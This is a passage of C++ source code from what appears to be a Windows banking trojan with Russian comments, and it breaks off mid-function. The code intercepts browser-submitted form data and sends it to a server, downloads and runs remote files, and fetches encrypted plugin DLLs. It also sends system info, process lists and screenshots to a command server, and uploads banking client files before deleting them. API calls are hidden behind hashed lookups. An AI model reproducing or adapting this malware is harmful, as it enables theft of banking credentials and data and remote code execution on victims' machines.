#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include "shlobj.h"

#include "Loader.h"
#include "GetApi.h"
#include "Strings.h"
#include "Memory.h"
#include "Crypt.h"
#include "Grabber.h"
#include "BotUtils.h"
#include "FtpSniffer.h"
#include "Inject.h"
#include "BotClasses.h"
#include "BotHTTP.h"
#include "Config.h"
#include "Task.h"

#include "Modules.h"

//#include "BotDebug.h"

#include "Utils.h"

typedef struct TSendDataHandler
{
	PCHAR HandleURL;       // Адрес который необходимо обработать
	PCHAR URL; 			   // Рабочий адрес
	PSendDataEvent Event;  // Событие обработки
	THandleDataMode Mode;  // Режим обработки
} *PSendDataHandler;


bool bSBStarted;

// Список зарегистрированных обработчиков отправки данных
HANDLE SendHandlersTID = NULL;  //  Инициализауию глобальных данных буднм
				        	   //  привязывать к идентификатору потока
PList SendDataHandlers = NULL;


void DestroyDataHandler(LPVOID Data)
{
	// Уничтожить данные
	PSendDataHandler H =  (PSendDataHandler)Data;
	STR::Free(H->HandleURL);
	STR::Free(H->URL);
	FreeStruct(Data);
}


 void InitializeHandlersList()
{
	// Инициализацию списка перехватчиков производим в случее еслт
	// он не создал либо создан в другом процессе
	HANDLE TID = pGetCurrentThreadId();

	if (SendDataHandlers == NULL || SendHandlersTID != TID)
	{
		SendDataHandlers = List::Create();
		List::SetFreeItemMehod(SendDataHandlers, DestroyDataHandler);
		SendHandlersTID = TID;
	}
}


DWORD RegisterSendDataHandler(PCHAR HandleURL, PSendDataEvent Event, THandleDataMode Mode, PCHAR SendURL)
{
	// Зарегистрировать обработчик отправки
	if (Event == NULL && Mode == hdmUnknown)
		return 0;

	InitializeHandlersList();
	
	PSendDataHandler Handler = CreateStruct(TSendDataHandler);
	if (Handler == NULL)
		return 0;

	Handler->HandleURL = STR::New(HandleURL);
	Handler->URL = STR::New(SendURL);
	Handler->Event = Event;
	Handler->Mode = Mode;

	List::Add(SendDataHandlers, Handler);

	return (DWORD)Handler;
}


void CallSendDataHandlers(PSendHTMLData Data, bool &Cancel)
{

	if (SendDataHandlers == NULL)
		return;


	// Вызвать обработчики отправки данных
	DWORD Count = List::Count(SendDataHandlers);
	PSendDataHandler Handler;

	bool IgnoreHandler;

	for (DWORD i = 0; i < Count; i++)
	{
		// Получаем новый обработчик
		Handler = (PSendDataHandler)List::GetItem(SendDataHandlers, i);

		// Проверяем адрес
		DWORD Tm;
		if (Handler->HandleURL != NULL && !WildCmp(Data->URL, Handler->HandleURL, &Tm, &Tm, &Tm))
			continue;

		// Вызываем событие
		IgnoreHandler = false;
		if (Handler->Event != NULL)
		{
			Handler->Event(Data, IgnoreHandler, Cancel);
			if (Cancel)
				return;
		}
		if (IgnoreHandler)
			continue;

		// Обрабатываем режим
		if (Handler->Mode != hdmUnknown && Handler->URL != NULL)
		{
			// Отправляем данные на сервер
			DataGrabber::SendHTMLDataToServer(Handler->URL, Data, NULL);
			if (Handler->Mode == hdmRedirect)
			{
				Cancel = true;
				return;
			}
        }
	}
}



bool GetSBStarted()
{
	return bSBStarted;
}
void SetSBStarted(bool bStartHideJava_SB)
{
	bSBStarted=bStartHideJava_SB;
}


bool ParseUrl( char *Url, char **Server, char **Path, int *Port )
{
	char *Ptr1 = NULL;
	char *Ptr2 = NULL;
	char *Ptr3 = NULL;
	char *Ptr4 = NULL;

	char *Host		   = (char*)MemAlloc( 512 );
	char *OptionalPort = (char*)MemAlloc( 512 );

	if ( Host == NULL ||
		 OptionalPort == NULL )
	{
		return false;
	}

	DWORD dwPort = 0;

	Ptr1 = m_strstr( Url, "://" );

	if( Ptr1 )
	{
		Ptr1 += 3;
	}
	else
	{
		Ptr1 = Url;
	}

    Ptr4 = m_strstr( Ptr1, "/" );
	Ptr2 = m_strstr( Ptr1, ":" );

	if( !Ptr2 )
	{
		*Port = 80;
		Ptr3   = m_strstr( Ptr1, "/" );

		if( !Ptr3 )
		{
			return false;
		}

		m_memcpy( Host, Ptr1, Ptr3 - Ptr1 );
		Host[ Ptr3 - Ptr1 ] = '\0';
	}
	else
	{
		Ptr3 = m_strstr( Ptr1, "/" );

		if( !Ptr3 )
		{
			return false;
		}

		m_memcpy( OptionalPort, Ptr2 + 1, Ptr3 - Ptr2 );
		m_memcpy( Host, Ptr1, Ptr2 - Ptr1 );

		OptionalPort[ Ptr3 - Ptr2 ] = '\0';
		Host[ Ptr2 - Ptr1 ]			= '\0';

		*Port = m_atoi( OptionalPort );
	}

	MemFree( OptionalPort );

	*Server = Host;
	*Path   = Ptr4;

	return true;
}

SOCKET MyConnect( char *Host, int Port )
{
	LPHOSTENT lpHost = (LPHOSTENT)pgethostbyname( (const char*)Host );

	if ( lpHost == NULL )
	{
		return -1;
	}

	SOCKET Socket = (SOCKET)psocket( AF_INET, SOCK_STREAM, 0 );

	if( Socket == -1 )
	{
		return -1;
	}

	struct sockaddr_in SockAddr;

	SockAddr.sin_family		 = AF_INET;
	SockAddr.sin_addr.s_addr = **(unsigned long**)lpHost->h_addr_list;
	SockAddr.sin_port		 = HTONS( (unsigned short)Port );

	if ( (int)pconnect( Socket, (const struct sockaddr*)&SockAddr, sizeof( SockAddr ) ) == SOCKET_ERROR )
	{
		pclosesocket(Socket);
		return -1;
	}

	return Socket;
}

bool MySend( SOCKET Socket, const char *Data, int DataLen )
{
	if ( (int)psend( Socket, Data, DataLen, 0 ) == SOCKET_ERROR )
	{
		return false;
	}

	return true;
}

bool CheckHost( char *Host )
{
	WSADATA wsa;

	if ( (int)pWSAStartup( MAKEWORD( 2, 2 ), &wsa ) != 0 )
	{
		return false;
	}

	bool ret = false;

	SOCKET Socket = MyConnect( Host, 80 );

	if ( Socket != -1 )
	{
		ret = true;
	}

	pclosesocket( Socket );

	return ret;
}

typedef struct
{
	HINTERNET hInstance;
	HINTERNET hConnect;
	HINTERNET hRequest;

	HANDLE hConnectedEvent;
	HANDLE hRequestOpenedEvent;
	HANDLE hRequestCompleteEvent;

	DWORD dwCurrent;

	bool IsDownloaded;
} ASYNCHTTP, *PASYNCHTTP;

void __stdcall Callback( HINTERNET hInternet, DWORD_PTR dwContext, DWORD dwInternetStatus, LPVOID lpStatusInfo, DWORD dwStatusInfoLen )
{
	PASYNCHTTP pData = (PASYNCHTTP)dwContext;

	if ( pData )
	{
		switch( pData->dwCurrent )
		{
			case 1:

				if ( dwInternetStatus == INTERNET_STATUS_HANDLE_CREATED )
				{
					INTERNET_ASYNC_RESULT *pRes = (INTERNET_ASYNC_RESULT *)lpStatusInfo;

					pData->hConnect = (HINTERNET)pRes->dwResult;
					pSetEvent( pData->hConnectedEvent );
				}
			break;

			case 2:

				switch(dwInternetStatus)
				{
					case INTERNET_STATUS_HANDLE_CREATED:

					{
						INTERNET_ASYNC_RESULT *pRes = (INTERNET_ASYNC_RESULT *)lpStatusInfo;

						pData->hRequest = (HINTERNET)pRes->dwResult;

						pSetEvent( pData->hRequestOpenedEvent );
					}

					break;

					case INTERNET_STATUS_REQUEST_SENT:

					{
						DWORD *lpBytesSent = (DWORD*)lpStatusInfo;
					}

					break;
					
					case INTERNET_STATUS_REQUEST_COMPLETE:
					{
						INTERNET_ASYNC_RESULT *pAsyncRes = (INTERNET_ASYNC_RESULT *)lpStatusInfo;
						pSetEvent( pData->hRequestCompleteEvent );
					}
					break;

					case INTERNET_STATUS_RECEIVING_RESPONSE:
					break;


					case INTERNET_STATUS_RESPONSE_RECEIVED:
					{
						DWORD *dwBytesReceived = (DWORD*)lpStatusInfo;

						if ( !*dwBytesReceived )
						{
							pData->IsDownloaded = true;
						}						
					}
				}

			break;

			default:
			break;

		}
	}

	return;
}


char *RecvAndParse( SOCKET Socket, LPDWORD dwRecved )
{
	DWORD dwLen = 0;

	char *Buffer = NULL;

	int Bytes = 0;

	char *TempBuffer = (char*)MemAlloc( 1024 );

	if ( TempBuffer == NULL )
	{
		return NULL;
	}

	while ( ( Bytes = (int)precv( Socket, TempBuffer, 1024, 0 ) ) != 0 )
	{
		if ( Bytes == -1 )
		{
			break;
		}

		if ( Buffer == NULL )
		{
			Buffer = (char*)MemAlloc( Bytes + 1 );

			if ( Buffer == NULL )
			{
				return NULL;
			}
		}
		else
		{
			char *p = (char*)MemRealloc( Buffer, dwLen + Bytes + 1 );
						
			if ( p == NULL )
			{
				return NULL;
			}

			Buffer = p;
		}

		m_memcpy( Buffer + dwLen, TempBuffer, Bytes );
		dwLen += Bytes;
	}

	MemFree( TempBuffer );

	if ( dwLen > 0 )
	{
		DWORD Offset = 0;

		for ( DWORD i = 0; i < dwLen; i++ )
		{
			if ( Buffer[i]     == '\r' && Buffer[i + 1] == '\n' &&
				 Buffer[i + 2] == '\r' && Buffer[i + 3] == '\n' )
			{
				Offset = i + 4;
				break;
			}
		}

		if ( Offset > 0 )
		{
			Buffer += Offset;
			dwLen  -= Offset;

			*dwRecved = dwLen;

			return Buffer;
		}
	}

	MemFree( Buffer );
	
	return NULL;
}



bool AsyncDownload1( char *Url, LPBYTE *lpBuffer, LPDWORD dwSize )
{
	WSADATA wsa;

	if ( (int)pWSAStartup( MAKEWORD( 2, 2 ), &wsa ) != 0 )
	{
		return false;
	}

	char *Host = NULL;
	char *Path = NULL;
	int   Port = 80;

	if ( !ParseUrl( Url, &Host, &Path, &Port ) )
	{
		return false;
	}

	SOCKET Socket = MyConnect( Host, Port );

	if( Socket == -1 )
	{
		return false;
	}

	char *UserAgent = NULL;
	UserAgent = (char*)MemAlloc( 1024 );
	DWORD dwUserSize = 1024;

	pObtainUserAgentString( 0, UserAgent, &dwUserSize );

	char *query=(char*)MemAlloc(2048);

	m_lstrcpy(query,"GET /");
	m_lstrcat(query,Path);
	m_lstrcat(query," HTTP/1.1\r\nAccept: */* \r\n ");
	m_lstrcat(query,"Accept-Language: ru \r\n");
	m_lstrcat(query,"UA-CPU: x86 \r\n");
	m_lstrcat(query,"Accept-Encoding: gzip, deflate \r\n");
	m_lstrcat(query,"User-Agent: ");
	m_lstrcat(query,UserAgent);
	m_lstrcat(query,"\r\nHost: ");
	m_lstrcat(query,Host);
	m_lstrcat(query,"\r\nConnection: Close\r\n\r\n\r\n");



	bool b = MySend( Socket, (const char *)query, m_lstrlen( query ) );


	MemFree( Host );
	//MemFree( Path );
	MemFree( UserAgent );
	MemFree( query );
	if ( !b )
	{
		return false;
	}

	DWORD dwSizeFile = 0;

	char *Buffer = RecvAndParse( Socket, &dwSizeFile );

	if ( !Buffer )
	{
		pclosesocket( Socket );
		return false;
	}

	if ( dwSize )
	{
		*lpBuffer  = (LPBYTE)Buffer;
		*dwSize    = dwSizeFile;

		return true;
	}

	return false;
}


bool AsyncDownload( char *Url, LPBYTE *lpBuffer, LPDWORD dwSize )
{
	char *Host = NULL;
	char *Path = NULL;
	int   Port = 0;

	if ( !ParseUrl( Url, &Host, &Path, &Port ) )
	{
		return false;
	}


	PASYNCHTTP pData = (PASYNCHTTP)MemAlloc( sizeof( PASYNCHTTP ) );

	if ( !pData )
	{
		return false;
	}

	pData->hConnectedEvent		 = pCreateEventW( NULL, FALSE, FALSE, NULL );
    pData->hRequestOpenedEvent	 = pCreateEventW( NULL, FALSE, FALSE, NULL );
    pData->hRequestCompleteEvent = pCreateEventW( NULL, FALSE, FALSE, NULL );

	char *UserAgent = (char*)MemAlloc( 1024 );

	DWORD dwUserSize = 1024;

	pObtainUserAgentString( 0, UserAgent, &dwUserSize );

	pData->hInstance = (HINTERNET)pInternetOpenA( UserAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, INTERNET_FLAG_ASYNC );

	LPBYTE lpBuf	 = NULL;
	DWORD  dwBufSize = 0;

	if ( pData->hInstance )
	{
		if ( pInternetSetStatusCallback( pData->hInstance, (INTERNET_STATUS_CALLBACK)&Callback) != INTERNET_INVALID_STATUS_CALLBACK)
		{
			pData->dwCurrent = 1;
			pData->hConnect  = (HINTERNET)pInternetConnectA( pData->hInstance, Host, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)pData );
			
			if ( !pData->hConnect )
			{
				if ( pGetLastError() != ERROR_IO_PENDING )
				{
					return false;
				}
				
				pWaitForSingleObject( pData->hConnectedEvent, INFINITE );
			}

			pData->dwCurrent = 2;
			pData->hRequest  = (HINTERNET)pHttpOpenRequestA( pData->hConnect, "GET", Path, NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, (DWORD_PTR)pData );

			if ( !pData->hRequest )
			{
				if ( pGetLastError() != ERROR_IO_PENDING )
				{
					return false;
				}

				pWaitForSingleObject( pData->hRequestOpenedEvent, INFINITE );
			}

			if ( !(BOOL)pHttpSendRequestA( pData->hRequest, NULL, 0, NULL, 0 ) )
			{
				if ( pGetLastError() != ERROR_IO_PENDING )
				{
					return false;
				}
			}

			pWaitForSingleObject( pData->hRequestCompleteEvent, INFINITE );

			LPBYTE pTmpBuf = (LPBYTE)MemAlloc( 4096 );

			if ( !pTmpBuf )
			{
				return false;
			}

			INTERNET_BUFFERSA ib;

			m_memset( &ib, 0, sizeof( INTERNET_BUFFERSA ) );
			
			ib.dwStructSize   = sizeof( INTERNET_BUFFERSA );
			ib.lpvBuffer	  = pTmpBuf;
			

			do
			{
				ib.dwBufferLength = 4096;

				if ( !(BOOL)pInternetReadFileExA( pData->hRequest, &ib, 0, 2 ) )
				{
					if ( pGetLastError() == ERROR_IO_PENDING)
					{
						pWaitForSingleObject( pData->hRequestCompleteEvent, INFINITE );
					}
					else
					{
						return false;
					}
				}

				if ( ib.dwBufferLength )
				{
					if ( !lpBuf )
					{
						if ( !( lpBuf = (LPBYTE)MemAlloc( ib.dwBufferLength + 1 ) ) )
						{
							return false;
						}
					}
					else
					{
						LPBYTE p = (LPBYTE)MemRealloc( lpBuf, dwBufSize + ib.dwBufferLength + 1 );

						if ( !p )
						{
							return false;
						}

						lpBuf = p;
					}

					m_memcpy( lpBuf + dwBufSize, pTmpBuf, ib.dwBufferLength );
					dwBufSize += ib.dwBufferLength;
				}
				else
				{
					pData->IsDownloaded = true;
				}

			} while ( !pData->IsDownloaded );
		}
	}

	pInternetCloseHandle( pData->hRequest  );
	pInternetCloseHandle( pData->hConnect  );
	pInternetCloseHandle( pData->hInstance );

	pCloseHandle( pData->hConnectedEvent       );
	pCloseHandle( pData->hRequestOpenedEvent   );
	pCloseHandle( pData->hRequestCompleteEvent );


	MemFree( pData );
	

	if ( dwSize )
	{
		*lpBuffer  = lpBuf;
		*dwSize    = dwBufSize;

		return true;
	}

	return false;
}





bool DownloadInternet( char *Url, WCHAR *FileName, DWORD dwFile, LPBYTE *lpMem, LPDWORD dwMemSize  )
{
	LPBYTE lpMemory;
	DWORD  dwMemorySize;

	bool ret = AsyncDownload1( Url, &lpMemory, &dwMemorySize );

	if ( ret )
	{
		if ( dwFile == 1 && FileName )
		{
			File::WriteBufferW( FileName, lpMemory, dwMemorySize );
			MemFree( lpMemory );
		}
		else
		{
			*lpMem		= lpMemory;
			*dwMemSize	= dwMemorySize;
		}
	}
	

	return ret;
}

bool DownloadInFile( char *Url, WCHAR *FileName )
{
	return DownloadInternet(Url, FileName, 1, NULL, NULL );
}

bool DownloadInMem( char *Url, LPBYTE *lpMem, LPDWORD dwSize )
{
	return DownloadInternet( Url, NULL, 0, lpMem, dwSize );
}


bool ExecuteFile( char *Url, WCHAR *FileName )
{
	DWORD dwSize = 0;

	bool Dwl = DownloadInFile( Url, FileName );

	if ( Dwl && pGetFileAttributesW( FileName ) )
	{
		if ( RunFile( FileName ) )
		{
			return true;
		}
	}

	return false;
}


//----------------------------------------------------------------------------
LPVOID DownloadPlugin(PCHAR URL)
{
	// Функция загружает плагин (DLL)

    // Зсгружаем файл
	PCHAR Buf = NULL;
	bool Ready = false;
	#ifdef CryptHTTPH
		const static char Ext[] = {'.', 'p', 's', 'd', 0};
		PCHAR CryptURL = File::ChangeFileExt(URL, (PCHAR)Ext);
		PCHAR Pass = GetMainPassword();

		Ready = CryptHTTP::Get(CryptURL, Pass, &Buf);

		STR::Free(CryptURL);
		STR::Free(Pass);
	#else
		Ready = HTTP::Get(URL, &Buf);
	#endif

	if (!Ready)
		return NULL;

	// Расшифровываем XOR алгоритмом
	const static char Signature[] = {'B', 'J', 'B', 0};
    DWORD Size = STR::Length(Buf);
	LPBYTE Body = XORCrypt::DecodeBuffer((PCHAR)Signature, Buf, Size);

	// Создаём чистый модуль
	LPVOID Module = NULL;
	if (Body != NULL && Size > 0)
	{
		Module = MemAlloc(Size);
		if (Module != NULL)
			m_memcpy(Module, Body, Size);
	}

	//
	STR::Free(Buf);

	return Module;
}

//----------------------------------------------------------------------------

bool SendGrabberReport(PCHAR URL, PCHAR Buf, DWORD BufSize)
{
	if (StrIsEmpty(URL) || Buf == NULL || BufSize == 0)
		return false;

	// Собираем  данные сниффера

	PCHAR BotID = GenerateBotID();

	PStrings Fields = Strings::Create();

	AddURLParam(Fields, "id", BotID);
	AddURLParam(Fields, "base", Buf, BufSize);
    STR::Free(BotID);

	#ifdef CryptHTTPH
        PCHAR Password = GetMainPassword();
		bool Result =  CryptHTTP::Post(URL, Password, Fields, NULL);
		STR::Free(Password);
	#else
		bool Result =  HTTP::Post(URL, Fields, NULL);
	#endif

	Strings::Free(Fields);

	return Result;
}

//----------------------------------------------------------------------------

bool SendFirstInfo()
{
	// Функция отправляет информацию о системе
	PCHAR Script = GetBotScriptURL(ScriptFirstInfo);

	PCHAR OSInfo   = GetOSInfo();
	PCHAR ProcList = GetProcessList();
	PCHAR ID = GenerateBotID();

    // Формируем POST данные
	PStrings Fields = Strings::Create();

	AddURLParam(Fields, "id", ID);
	AddURLParam(Fields, "os", OSInfo);
	AddURLParam(Fields, "plist", ProcList);


	MemFree(OSInfo);
	MemFree(ProcList);
	STR::Free(ID);

	// Лтправляем запрос
	#ifdef CryptHTTPH
		PCHAR Password = GetMainPassword();
		bool Result = CryptHTTP::Post(Script, Password, Fields, NULL);;
		STR::Free(Password);
	#else
		bool Result = HTTP::Post(Script, Fields, NULL);
	#endif

	Strings::Free(Fields);
	STR::Free(Script);

	return Result;
}


#pragma optimize("", off)
bool SendTradeInfo( char *Buffer )
{
	char *Serv = GetCurrentHost();
	
	if ( Serv == NULL )
	{
		return 0;
	}

	char Host[30];
	m_lstrcpy( Host, Serv );

	char Script[]  = {'/','g','e','t','/','t','r','a','.','h','t','m','l',0};
	char Args[]	   = "id=%s&data=%s";

	char Request[] = "POST %s HTTP/1.1\r\n"
					 "Host: %s\r\n"
					 "User-Agent: %s\r\n"
					 "Accept: text/html\r\n"
					 "Connection: Close\r\n"
					 "Content-Type: application/x-www-form-urlencoded\r\n"
					 "Content-Length: %d\r\n\r\n";

	char Uid[100];
	GenerateUid( Uid );

	char *Data	   = URLEncode( Buffer );
	char *PartReq  = (char*)MemAlloc( 1024 );

	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

	if ( PartReq == NULL )
	{
		return false;
	}
	
	_pwsprintfA( PartReq, Args, Uid, Data );

	
	char *Header = (char*)MemAlloc( 1024 );

	if ( Header == NULL )
	{
		MemFree( PartReq );
		return false;
	}


	char *UserAgent = (char*)MemAlloc( 1024 );
	DWORD dwUserSize = 1024;

	pObtainUserAgentString( 0, UserAgent, &dwUserSize );

	_pwsprintfA( Header, Request, Script, Host, UserAgent, m_lstrlen( PartReq ) );

	MemFree( UserAgent );
	
	char *SendBuffer = (char*)MemAlloc( m_lstrlen( PartReq ) + m_lstrlen( Header ) + 1 + 2 );

	if ( SendBuffer == NULL )
	{
		MemFree( PartReq );
		MemFree( Header );
		return false;
	}

	m_lstrcpy( SendBuffer, Header );
	m_lstrcat( SendBuffer, PartReq );
	m_lstrcat( SendBuffer, "\r\n" );

	MemFree( Header  );
	MemFree( PartReq );

	SOCKET Socket = MyConnect( Host, 80 );

	bool Ret = MySend( Socket, (const char *)SendBuffer, m_lstrlen( SendBuffer ) );

	pclosesocket( Socket );

	MemFree( SendBuffer );

	return  Ret;
}



char *GetInfoFromBcServer( char *Url )
{
	WSADATA wsa;

	if ( (int)pWSAStartup( MAKEWORD( 2, 2 ), &wsa ) != 0 )
	{
		return false;
	}

	char *Host = NULL;
	char *Path = NULL;
	int   Port = 0;

	if ( !ParseUrl( Url, &Host, &Path, &Port ) )
	{
		return false;
	}

	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

	char Request[] = "GET %s HTTP/1.0\r\n"
					 "Host: %s\r\n"
					 "User-Agent: %s\r\n"
					 "Connection: close\r\n\r\n";


	char *HttpPacket = (char*)MemAlloc( 1024 );

	if ( HttpPacket == NULL )
	{
		return false;
	}

	char *UserAgent = (char*)MemAlloc( 1024 );
	DWORD dwUserSize = 1024;

	pObtainUserAgentString( 0, UserAgent, &dwUserSize );

	_pwsprintfA( HttpPacket, Request, Path, Host, UserAgent );

	SOCKET Socket = MyConnect( Host, Port );

	if ( Socket == INVALID_SOCKET )
	{
		MemFree( HttpPacket );
		return NULL;
	}

	bool b = MySend( Socket, (const char *)HttpPacket, m_lstrlen( HttpPacket ) );

	MemFree( HttpPacket );

	if ( !b )
	{
		return NULL;
	}

	DWORD dwSize = 0;

	char *Buffer = RecvAndParse( Socket, &dwSize );

	pclosesocket( Socket );

	return Buffer;
}

#pragma optimize("", off)
bool SendScreen( LPVOID lpFile, DWORD dwFileSize )
{
	WSADATA wsa;

	if ( (int)pWSAStartup( MAKEWORD( 2, 2 ), &wsa ) != 0 )
	{
		return false;
	}

	char *CheckHost = GetCurrentHost();

	if ( !CheckHost )
	{
		return false;
	}

	char Host[30];
	m_lstrcpy( Host, CheckHost );

	char HeaderTemplate[] = "POST /get/scr.html HTTP/1.0\r\n"
							"Host: %s\r\n"
							"User-Agent: %s\r\n"
							"Connection: close\r\n"
							"Content-Length: %d\r\n"
							"Content-Type: multipart/form-data; boundary=---------------------------%d\r\n\r\n";

	char *Boundary = (char*)MemAlloc( 100 );

	if ( Boundary == NULL )
	{
		MemFree( lpFile );
		return false;
	}

	DWORD dwBoundary = (DWORD)pGetTickCount();
	char *Boundary_1 = (char*)MemAlloc( 100 );

	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

	_pwsprintfA( Boundary_1, "-----------------------------%d\r\n", dwBoundary  );

	char Uid[100];
	GenerateUid( Uid );

	char *UserAgent = (char*)MemAlloc( 1024 );
	DWORD dwUserSize = 1024;

	pObtainUserAgentString( 0, UserAgent, &dwUserSize );

	char *SendBuffer_1 = (char*)MemAlloc( 1024 );
	char *SendBuffer_2 = (char*)MemAlloc( 1024 + dwFileSize );

	//id
	_pwsprintfA( SendBuffer_1, "%sContent-Disposition: form-data; name=\"id\"\r\n\r\n%s\r\n", Boundary_1, Uid );

	//file
	_pwsprintfA( SendBuffer_2, "%sContent-Disposition: form-data; name=\"screen\"; filename=\"%d\"\r\nContent-Type: application/octet-stream\r\n\r\n", Boundary_1, (DWORD)pGetTickCount()  );

	DWORD dwBuffer2Len = m_lstrlen( SendBuffer_2 );

	m_memcpy( SendBuffer_2 + dwBuffer2Len, lpFile, dwFileSize );

	DWORD dwContentLen = m_lstrlen( SendBuffer_1 ) + dwBuffer2Len + dwFileSize + m_lstrlen( Boundary_1 ) + 2;

	char *Header = (char*)MemAlloc( 1024 );
	_pwsprintfA( Header, HeaderTemplate, Host, UserAgent, dwContentLen, dwBoundary );

	bool ret = false;

	SOCKET Socket = MyConnect( Host, 80 );	

	if( Socket != -1 )
	{
		MySend( Socket, (const char *)Header, m_lstrlen( Header ) );
		MySend( Socket, (const char *)SendBuffer_1, m_lstrlen( SendBuffer_1 ) );
		MySend( Socket, (const char *)SendBuffer_2, dwBuffer2Len + dwFileSize );
		MySend( Socket, "\r\n", 2 );
		MySend( Socket, Boundary_1,   m_lstrlen( Boundary_1 ) );
		MySend( Socket, "\r\n", 2 );

		ret = true;

		pclosesocket( Socket );
	}

	MemFree( Header );
	MemFree( SendBuffer_1 );
	MemFree( SendBuffer_2 );

	return ret;
}

//  Новая функция RuBnk
//  #ifdef RuBnkH
DWORD WINAPI SendBSSInist( LPVOID lpData )
{
	if ( !lpData )
	{
		return 0;
	}

	PBSSINIST pBank = (PBSSINIST)lpData;

	char *FilePath = pBank->FilePath;

	HANDLE hFile = pCreateFileA( FilePath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );
	
	if ( hFile == INVALID_HANDLE_VALUE )
	{		
		return 0;
	}
	
	DWORD h;
	DWORD dwFileSize = (DWORD)pGetFileSize( hFile, &h );		

	LPBYTE lpFile = NULL;

	if ( dwFileSize > 0 )
	{
		HANDLE hMapFile = (HANDLE)pCreateFileMappingA( hFile, 0, PAGE_READONLY, 0, 0, 0 );

		if ( hMapFile != INVALID_HANDLE_VALUE )
		{
			LPBYTE pbyFile = (LPBYTE)pMapViewOfFile( hMapFile, FILE_MAP_READ, 0, 0, 0 );

			if ( ( lpFile = (LPBYTE)MemAlloc( dwFileSize + 1 ) ) != NULL )
			{
				m_memcpy( lpFile, pbyFile, dwFileSize );
			}

			pUnmapViewOfFile( pbyFile );
		}

		pCloseHandle( hMapFile );
	}

	pCloseHandle( hFile );


	if ( !lpFile )
	{
		return 0;
	}

	char HeaderTemplate[] = "POST /get/cab.html HTTP/1.0\r\n"
							"Host: %s\r\n"
							"User-Agent: %s\r\n"
							"Connection: close\r\n"
							"Content-Length: %d\r\n"
							"Content-Type: multipart/form-data; boundary=---------------------------%d\r\n\r\n";

	char *Boundary = (char*)MemAlloc( 100 );

	if ( Boundary == NULL )
	{
		MemFree( lpFile );
		return false;
	}

	DWORD dwBoundary = (DWORD)pGetTickCount();
	char *Boundary_1 = (char*)MemAlloc( 100 );

	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

	_pwsprintfA( Boundary_1, "-----------------------------%d\r\n", dwBoundary  );

	char Uid[100];
	GenerateUid( Uid );

	char *UserAgent = (char*)MemAlloc( 1024 );
	DWORD dwUserSize = 1024;

	pObtainUserAgentString( 0, UserAgent, &dwUserSize );

	char *SendBuffer_1 = (char*)MemAlloc( 1024 );
	char *SendBuffer_2 = (char*)MemAlloc( 1024 + dwFileSize );
	char *SendBuffer_3 = (char*)MemAlloc( 1024 );

	//id
	_pwsprintfA( SendBuffer_1, "%sContent-Disposition: form-data; name=\"id\"\r\n\r\n%s\r\n", Boundary_1, Uid );

	//file
	_pwsprintfA( SendBuffer_2, "%sContent-Disposition: form-data; name=\"cab\"; filename=\"%d\"\r\nContent-Type: application/octet-stream\r\n\r\n", Boundary_1, (DWORD)pGetTickCount()  );

	//type
	_pwsprintfA( SendBuffer_3, "%sContent-Disposition: form-data; name=\"type\"\r\n\r\n%d\r\n", Boundary_1, pBank->dwType );

// ifobs   - 8
	//QWidget - 9



	
	DWORD dwBuffer2Len = m_lstrlen( SendBuffer_2 );

	m_memcpy( SendBuffer_2 + dwBuffer2Len, lpFile, dwFileSize );

	DWORD dwContentLen = m_lstrlen( SendBuffer_1 ) + dwBuffer2Len  + m_lstrlen( SendBuffer_3 ) + dwFileSize + m_lstrlen( Boundary_1 ) + 2;

	WSADATA wsa;

	if ( (int)pWSAStartup( MAKEWORD( 2, 2 ), &wsa ) != 0 )
	{
		return 0;
	}

	char *Host = GetCurrentHost();
	bool ret = false;
	char *Header = NULL;

	
	if ( Host )
	{
		char Server[100];
		m_lstrcpy( Server, Host );

		SOCKET Socket = MyConnect( Server, 80 );		
		if( Socket != -1 )
		{
			Header = (char*)MemAlloc( 1024 );
			_pwsprintfA( Header, HeaderTemplate, Server, UserAgent, dwContentLen, dwBoundary );

			MySend( Socket, (const char *)Header, m_lstrlen( Header ) );
			MySend( Socket, (const char *)SendBuffer_1, m_lstrlen( SendBuffer_1 ) );
			MySend( Socket, (const char *)SendBuffer_3, m_lstrlen( SendBuffer_3 ) );
			MySend( Socket, (const char *)SendBuffer_2, dwBuffer2Len + dwFileSize );	
			MySend( Socket, "\r\n", 2 );
			MySend( Socket, Boundary_1,   m_lstrlen( Boundary_1 ) );
			MySend( Socket, "\r\n", 2 );

			DWORD dw = 0;
			char * Buf = RecvAndParse( Socket, &dw );

			if ( !m_lstrncmp( Buf, "OK!", 3 ) )
			{			
				ret = true;
			}

			MemFree( Buf );
								
			pclosesocket( Socket );
		}
	}

	MemFree( Header );
	MemFree( SendBuffer_1 );
	MemFree( SendBuffer_2 );
	MemFree( SendBuffer_3 );
	MemFree( lpFile );
	
	if ( !ret )
	{
		pSleep( 1000 * 5 );
		StartThread( SendBSSInist, lpData );
		return 0;
	}

	pDeleteFileA( FilePath );
	MemFree( FilePath );
	MemFree( pBank );


	return ret;
}
//#endif



//****************************************************************************
//  DataGrabber - Функции для работы с отправляемыми данными
//****************************************************************************


const DWORD GrabberFileSignature = 0xF345FA56;

const char DataFileExt[] = {'.', 'x', 's', 'i', 0};
const static char DataFileMask[] = {'*', '.', 'x', 's', 'i', 0};


namespace DataSender
{

	void ProcessDataFile(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel)
	{
		// Обрабатываем найденный файл
		PStrings Files = (PStrings)Data;
		if (Strings::IndexOf(Files, FileName) >= 0)
